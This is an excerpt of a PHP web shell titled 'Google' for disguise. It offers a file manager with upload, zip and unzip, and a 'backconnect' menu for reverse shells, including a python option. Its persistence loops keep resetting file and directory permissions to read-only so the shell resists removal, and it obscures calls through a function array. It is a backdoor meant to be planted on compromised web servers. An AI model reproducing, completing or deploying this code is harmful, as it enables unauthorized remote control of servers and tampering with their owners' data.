...
<head>
    ...
    <title>Google [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    ...
    <style>
        ...
        tbody tr:nth-child(2n) {
            background: url(https://i.pinimg.com/originals/7c/de/2e/7cde2ea6c641527af6ace384e42c89e6.gif)norepeat;
        ...
        body {
            background: url(https://i.pinimg.com/originals/7c/de/2e/7cde2ea6c641527af6ace384e42c89e6.gif);
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-Google"><img width="400" height="400" src="https://i.gifer.com/76cI.gif" align="right"></li>
    ...
    <div class="menu-file-manager">
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_D) : ?>
                        ...
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- Google Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="Google-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="Google-select" class="btn-submit">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-Google box-shadow" name="Google-bc">
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['Google-bc'] == "python") {
...
while (True){
    ...
    if (Google_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (Google_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function Google_perm($flename){
...
if (isset($_POST['Google-up-submit'])) {
    $namaFilenya = $_FILES['Google-upload']['name'];
    $tmpName = $_FILES['Google-upload']['tmp_name'];
...
if (isset($_POST['submit-action'])) {
    ...
    } else if ($_POST['Google-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['Google-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
...
while (True){
    ...
    if (Google_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (Google_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
